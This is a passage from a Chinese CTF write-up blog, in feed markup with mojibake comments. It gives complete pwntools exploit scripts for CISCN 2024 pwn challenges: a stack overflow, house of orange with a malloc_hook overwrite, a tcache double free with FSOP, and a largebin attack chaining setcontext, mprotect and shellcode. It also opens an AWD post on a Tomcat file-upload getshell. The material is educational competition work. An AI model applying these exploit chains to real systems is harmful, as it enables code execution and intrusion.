class="hljs-number">0x3D</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x4D</span>,<br>    <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x78</span><br>&#125;;<br><br>void dump_data(unsigned char* data, size_t size, <span class="hljs-built_in">int</span> <span class="hljs-built_in">type</span>) &#123;<br>    <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>    &#123;   <span class="hljs-keyword">if</span> (<span class="hljs-built_in">type</span>)<br>            printf(<span class="hljs-string">&quot;%c&quot;</span>, data[i]);<br>        <span class="hljs-keyword">else</span><br>            printf(<span class="hljs-string">&quot;%d,&quot;</span>, data[i]);<br>    &#125;<br>    printf(<span class="hljs-string">&quot;\n\n&quot;</span>);<br><br>&#125;<br><br>void brute_force() &#123;<br>    size_t length = <span class="hljs-number">38</span>;<br>    unsigned char enc_data[] = <span class="hljs-string">&quot;congratulationstoyoucongratulationstoy&quot;</span>;<br>    unsigned char result[<span class="hljs-number">40</span>], shuffled_result[<span class="hljs-number">40</span>], final_result[<span class="hljs-number">40</span>];<br>    unsigned char shuffle_table[<span class="hljs-number">40</span>];<br><br><br>    unsigned char xor_key1[<span class="hljs-number">38</span>];<br>    unsigned char xor_key2[<span class="hljs-number">38</span>];<br><br>    unsigned <span class="hljs-built_in">int</span> current_time = <span class="hljs-number">1715788800</span>;//(unsigned <span class="hljs-built_in">int</span>)time(NULL);<br>    printf(<span class="hljs-string">&quot;current time: %d\n&quot;</span>, current_time);<br><br>    <span class="hljs-keyword">for</span> (unsigned <span class="hljs-built_in">int</span> seed = current_time; seed &gt;= <span class="hljs-number">0</span>; --seed) &#123;<br>        srand(seed &amp; <span class="hljs-number">0xF0000000</span>);<br><br>        // å¼‚æˆ–<br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            xor_key1[i] = rand();<br>        &#125;<br><br>        // ç”Ÿæˆè¡¨<br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            shuffle_table[i] = i;<br>        &#125;<br><br>        // æ‰“ä¹±è¡¨<br>        <span class="hljs-keyword">for</span> (size_t k = length - <span class="hljs-number">1</span>; k; --k) &#123;<br>            size_t rand_idx = rand() % (k + <span class="hljs-number">1</span>);<br>            unsigned char temp = shuffle_table[k];<br>            shuffle_table[k] = shuffle_table[rand_idx];<br>            shuffle_table[rand_idx] = temp;<br>        &#125;<br><br><br>        // å¼‚æˆ–<br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            xor_key2[i] = rand();<br>        &#125;<br><br>        // ---------------------------------------------------<br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            final_result[i] = enc_data[i] ^ key[i];<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            final_result[i] ^= xor_key2[i];<br>        &#125;<br><br>        // æ¢å¤æ‰“ä¹±çš„æ•°æ®<br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            shuffled_result[shuffle_table[i]] = final_result[i];<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            result[i] ^= xor_key1[i];<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ( result[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;f&#x27;</span><br>        &amp;&amp; result[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;l&#x27;</span><br>        &amp;&amp; result[<span class="hljs-number">2</span>] == <span class="hljs-string">&#x27;a&#x27;</span><br>        &amp;&amp; result[<span class="hljs-number">3</span>] == <span class="hljs-string">&#x27;g&#x27;</span><br>        &amp;&amp; result[<span class="hljs-number">4</span>] == <span class="hljs-string">&#x27;&#123;&#x27;</span>) &#123;<br>            dump_data(result, <span class="hljs-number">38</span>, <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-built_in">int</span> main() &#123;<br>    printf(<span class="hljs-string">&quot;magic........\n&quot;</span>);<br>    brute_force();<br>&#125;<br></code></pre></td></tr></table></figure>



<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="gostack"><a href="#gostack" class="headerlink" title="gostack"></a>gostack</h2><p>func3ä¸­å­˜åœ¨æ ˆæº¢å‡ºï¼Œæ„é€ payloadï¼Œä½†è¦å°å¿ƒrbp-0xc8ä¸rbp-0xd0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p=process(&quot;./gostack&quot;)</span><br>p=remote(<span class="hljs-string">&quot;8.147.133.9&quot;</span>,<span class="hljs-string">&quot;39706&quot;</span>)<br>e=ELF(<span class="hljs-string">&quot;./gostack&quot;</span>)<br>payload=<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0x4C0995</span>)+p64(<span class="hljs-number">0x1c8</span>)<br>payload+=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc0</span>+p64(<span class="hljs-number">0x4a0af6</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;message :&quot;</span>,payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h2 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h2><p>freeæ—¶å­˜åœ¨uafï¼Œeditæ—¶å…è®¸æº¢å‡º8å­—èŠ‚ï¼Œä½¿ç”¨house of orangeå°†top chunkæ”¾è¿›unsorted binï¼Œå³å¯è·å–libcåœ°å€<br>ä¿®æ”¹malloc_hookä¸ºgadgetå³å¯è·å–shell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">count,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    pause()<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,<span class="hljs-built_in">str</span>(count).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">count,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content&#x27;</span>,<span class="hljs-built_in">str</span>(count).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;content&#x27;</span>,data)<br>    pause()<br><br>libc=ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;8.147.131.196&quot;</span>,<span class="hljs-string">&quot;32607&quot;</span>)<br><span class="hljs-comment">#p=process(&quot;./orange_cat_diary&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendlineafter(<span class="hljs-string">&#x27;name&#x27;</span>,<span class="hljs-string">&#x27;rotwill&#x27;</span>)<br>add(<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+p64(<span class="hljs-number">0x1001</span>-<span class="hljs-number">0x70</span>)[:-<span class="hljs-number">1</span>])<br>add(<span class="hljs-number">0x1000</span>)<br>add(<span class="hljs-number">0x68</span>)<br><span class="hljs-comment">#edit(0x60,b&#x27;a&#x27;*0x58+b&#x27;rotwilll&#x27;)</span><br>show()<br>p.readuntil(<span class="hljs-string">&#x27;:&#x27;</span>)<br>d=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-<span class="hljs-number">0x3c510a</span><br>malloc_hook=libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br>gadget=libc.address+<span class="hljs-number">0xf03a4</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook))<br>free()<br>edit(<span class="hljs-number">8</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x13</span>+p64(gadget))<br>p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;content:&#x27;</span>,<span class="hljs-string">&quot;123&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="easybuf"><a href="#easybuf" class="headerlink" title="easybuf"></a>easybuf</h2><p>èµ›åå‡ºçš„</p>
<p>ä¸€ä¸ªä½¿ç”¨äº†protobufçš„èœå•é¢˜ï¼Œåªèƒ½ç”³è¯·0x30å­—èŠ‚çš„chunkï¼Œè¾“å‡ºçš„è¶…è¿‡ä¸‰æ¬¡ä¼šå…³é—­è¾“å‡ºå¥æŸ„ï¼Œä¸è¿‡é‡Šæ”¾æ—¶å­˜åœ¨uafï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨fast binæ„é€ tcache binä¸­çš„double freeï¼Œä¹‹åå°±å¯ä»¥ä»»æ„åœ°å€å†™äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> varint<br><span class="hljs-keyword">import</span> sys<br>num=<span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Mode</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span>+varint.encode(m&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Ind</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x18&#x27;</span>+varint.encode(i&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Spbuf</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> s:<br>        s=<span class="hljs-number">0x30</span><br>    <span class="hljs-keyword">else</span>:<br>        s=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x20&#x27;</span>+varint.encode(s&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Data</span>(<span class="hljs-params">d</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0a&#x27;</span>+varint.encode(<span class="hljs-built_in">len</span>(d))+d<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Spchr</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x28&#x27;</span>+varint.encode(s)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">data</span>):<br>    mark=<span class="hljs-number">0xfff000000000</span><br>    data1=data&amp;mark<br>    result=<span class="hljs-number">0</span><br>    result|=data1<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        data1=((data1&gt;&gt;<span class="hljs-number">12</span>)^data)&amp;(mark&gt;&gt;<span class="hljs-number">12</span>)<br>        result|=data1<br>        mark=mark&gt;&gt;<span class="hljs-number">12</span><br>    <span class="hljs-keyword">return</span> result<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    payload=Mode(<span class="hljs-number">1</span>)+Ind(ind)+Data(data)+Spbuf(<span class="hljs-number">0</span>)+Spchr(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> num!=<span class="hljs-number">3</span>:<br>        p.sendafter(<span class="hljs-string">&#x27;NT?\n&#x27;</span>,payload)<br>    <span class="hljs-keyword">else</span>:<br>        p.send(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">2</span>)+Ind(ind)+Data(<span class="hljs-string">b&#x27;test&#x27;</span>)+Spbuf(<span class="hljs-number">0</span>)+Spchr(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> num!=<span class="hljs-number">3</span>:<br>        p.sendafter(<span class="hljs-string">&#x27;NT?\n&#x27;</span>,payload)<br>    <span class="hljs-keyword">else</span>:<br>        p.send(payload)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">none</span>():<br>    payload=Mode(<span class="hljs-number">0</span>)+Ind(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;test&#x27;</span>)+Spbuf(<span class="hljs-number">0</span>)+Spchr(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> num!=<span class="hljs-number">3</span>:<br>        p.sendafter(<span class="hljs-string">&#x27;NT?\n&#x27;</span>,payload)<br>    <span class="hljs-keyword">else</span>:<br>        p.send(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind,isbuf=<span class="hljs-number">0</span>,spchr=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">global</span> num<br>    payload=Mode(<span class="hljs-number">3</span>)+Ind(ind)+Spbuf(isbuf)+Spchr(spchr)+Data(<span class="hljs-string">b&#x27;test&#x27;</span>)<br>    <span class="hljs-keyword">if</span> num!=<span class="hljs-number">3</span>:<br>        p.sendafter(<span class="hljs-string">&#x27;NT?\n&#x27;</span>,payload)<br>        p.readuntil(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>        num+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        p.send(payload)<br>        pause<br><span class="hljs-comment">#        p.readuntil(&#x27;Content:&#x27;)</span><br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>p=process([<span class="hljs-string">&quot;./pwn&quot;</span>])<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-string">b&quot;0&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;testtest&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>d=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=d-<span class="hljs-number">0x21ac30</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>stdout=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>vtable=stdout+<span class="hljs-number">0xd0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(vtable))<br>obstack_jump=libc.address+<span class="hljs-number">0x2173c0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    add(i+<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i)<br><br>show(<span class="hljs-number">1</span>)<br>d=u64(p.readuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>chunk0=calc(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;chunk0=: x&#125;</span>&quot;</span>)<br>free(<span class="hljs-number">7</span>)<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>chunk6=chunk0+<span class="hljs-number">0x1d60</span><br>chunk7=chunk0+<span class="hljs-number">0x2020</span><br>obstack=p64(system)<br>obstack+=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(chunk7+<span class="hljs-number">8</span>)<br><span class="hljs-comment">#obstack=obstack.ljust(0x28,b&#x27;\x00&#x27;)+p64(0x7fffffffffffffff)+p64(0)+p64(system)</span><br><br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>)+p64((chunk6&gt;&gt;<span class="hljs-number">12</span>)^(chunk7-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">6</span>,payload)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;chunk6=: x&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;chunk7=: x&#125;</span>&quot;</span>)<br><br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">8</span>,p64((chunk7&gt;&gt;<span class="hljs-number">12</span>)^(chunk6)))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(vtable))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0</span>,obstack)<br><br><span class="hljs-comment">#show(0)</span><br><span class="hljs-comment">#show(0)</span><br><span class="hljs-comment">#@add(0)</span><br>free(<span class="hljs-number">6</span>)<br><span class="hljs-comment">#add(8,p64()</span><br><br><br>gdb.attach(p)<br>pause()<br>add(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x40</span>)+p64(((chunk6+<span class="hljs-number">0x10</span>)&gt;&gt;<span class="hljs-number">12</span>)^(vtable)))<br><br><span class="hljs-comment">#add(1,obstack)#</span><br>payload1=p64(<span class="hljs-number">0</span>)+p64(obstack_jump)+p64(chunk7-<span class="hljs-number">0x38</span>)<br>add(<span class="hljs-number">2</span>,payload1)<br>add(<span class="hljs-number">2</span>,payload1)<br><span class="hljs-comment">#add(0)</span><br><br><span class="hljs-comment">#print(hex(calc(d)))</span><br>p.interactive()<br></code></pre></td></tr></table></figure>


<h2 id="EzHeap"><a href="#EzHeap" class="headerlink" title="EzHeap"></a>EzHeap</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">l,data=<span class="hljs-string">b&#x27;\n&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(l).encode())<br>    p.sendafter(<span class="hljs-string">b&quot;content:&quot;</span>,data);<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;idx&quot;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)).encode())<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx&#x27;</span>,<span class="hljs-built_in">str</span>(ind).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br><span class="hljs-comment">#p=process(&quot;EzHeap&quot;)</span><br>p=remote(<span class="hljs-string">&quot;8.147.134.47&quot;</span>,<span class="hljs-string">&quot;35955&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp setcontext+0x3d&#x27;)</span><br>add(<span class="hljs-number">0x300</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x448</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x300</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x438</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x300</span>) <span class="hljs-comment">#4</span><br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span>+<span class="hljs-string">b&#x27;rotwilll&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br><br>p.readuntil(<span class="hljs-string">&#x27;rotwilll&#x27;</span>)<br>large=u64(p.readuntil(<span class="hljs-string">&#x27;Welcome&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(large))<br>pause()<br>libc.address=large-<span class="hljs-number">0x21b0e0</span><br>stdout=libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>wfile_jump=libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>iolist=libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>success(<span class="hljs-string">f&quot;libcaddr=0x<span class="hljs-subst">&#123;libc.address:x&#125;</span>&quot;</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span>+p64(<span class="hljs-number">0x451</span>)+p64(large)*<span class="hljs-number">2</span>+p64(iolist-<span class="hljs-number">0x20</span>)*<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x500</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x308</span>+<span class="hljs-string">b&#x27;rotwilll&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">&#x27;rotwilll&#x27;</span>)<br>chunk=u64(p.readuntil(<span class="hljs-string">&#x27;Welcome&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(chunk))<br><br>fake_io_add=chunk<br>chunk1=chunk-<span class="hljs-number">0x300</span><br>gs=chunk1<br>shelladd=chunk1+<span class="hljs-number">0x200</span><br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>)+shellcraft.read(<span class="hljs-number">3</span>,chunk,<span class="hljs-number">0x300</span>)+shellcraft.write(<span class="hljs-number">1</span>,chunk,<span class="hljs-number">0x300</span>)<br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>setcontext=libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>gadget=libc.address+<span class="hljs-number">0x167420</span><br><br>fake_io=flat(&#123;<br>    <span class="hljs-number">0x28</span>: [gs,<span class="hljs-number">1</span>],<br>    <span class="hljs-number">0x98</span>: fake_io_add+<span class="hljs-number">0x28</span>,<br>    <span class="hljs-number">0xa0</span>: fake_io_add,<br>    <span class="hljs-number">0xd8</span>: wfile_jump+<span class="hljs-number">0x30</span>,<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>gsdata=flat(&#123;<br>    <span class="hljs-number">8</span>: [gs,shelladd],<br>    <span class="hljs-number">0x20</span>: setcontext+<span class="hljs-number">0x3d</span>,<br>    <span class="hljs-number">0x28</span>: gadget,<br>    <span class="hljs-number">0x68</span>: gs&amp;(~<span class="hljs-number">0xfff</span>), <span class="hljs-comment"># rdi</span><br>    <span class="hljs-number">0x70</span>: <span class="hljs-number">0x1000</span>, <span class="hljs-comment"># rsi</span><br>    <span class="hljs-number">0x88</span>: <span class="hljs-number">7</span>, <span class="hljs-comment"># rdx</span><br>    <span class="hljs-number">0xa0</span>: gs+<span class="hljs-number">0x10</span>, <span class="hljs-comment">#rsp</span><br>    <span class="hljs-number">0xa8</span>: mprotect, <span class="hljs-comment">#rcx-&gt;rip</span><br>    <span class="hljs-number">0xe0</span>: gs<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-comment">#payload=fake_io#+asm(shellcode)</span><br><br>payload=gsdata<br>payload=payload.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=asm(shellcode)<br>payload=payload.ljust(<span class="hljs-number">0x300</span>)<br><span class="hljs-comment">#add(0x438,payload[0x10:])</span><br>payload=payload+fake_io<br><br>edit(<span class="hljs-number">2</span>,payload)<br><br><span class="hljs-comment">#exit()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="å¤å…¸å¯†ç "><a href="#å¤å…¸å¯†ç " class="headerlink" title="å¤å…¸å¯†ç "></a>å¤å…¸å¯†ç </h2><p><img src="/img/wp/2024/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81-1.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ciscn</tag>
        <tag>2024</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬ä¸€å±Šé•¿åŸæ¯ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›åŠå†³èµ›ï¼ˆç¬¬ä¸‰èµ›åŒºï¼‰AWD WP</title>
    <url>/posts/359b7a99/</url>
    <content><![CDATA[<p>rank: 6</p>
<h1 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h1><h2 id="æ¼æ´1-æ–‡ä»¶ä¸Šä¼ getshell"><a href="#æ¼æ´1-æ–‡ä»¶ä¸Šä¼ getshell" class="headerlink" title="æ¼æ´1-æ–‡ä»¶ä¸Šä¼ getshell"></a>æ¼æ´1-æ–‡ä»¶ä¸Šä¼ getshell</h2><p><code>data.sql</code>æ³„éœ²æ•™å¸ˆè´¦å·å¯†ç </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `teacher` <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;admin1&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;admin@qq.com&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>ç™»å½•åå°<code>login.jsp</code></p>
<p>åå°ç”¨æˆ·ä¸Šä¼ å¤´åƒå¤„å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ </p>
<p><img src="/img/awd/ccb-tomcat-1.png"></p>
<p><strong>æ”»å‡»ï¼š</strong></p>
<p><img src="/img/awd/ccb-tomcat-2.png"></p>
<p><strong>ä¿®å¤ï¼š</strong></p>
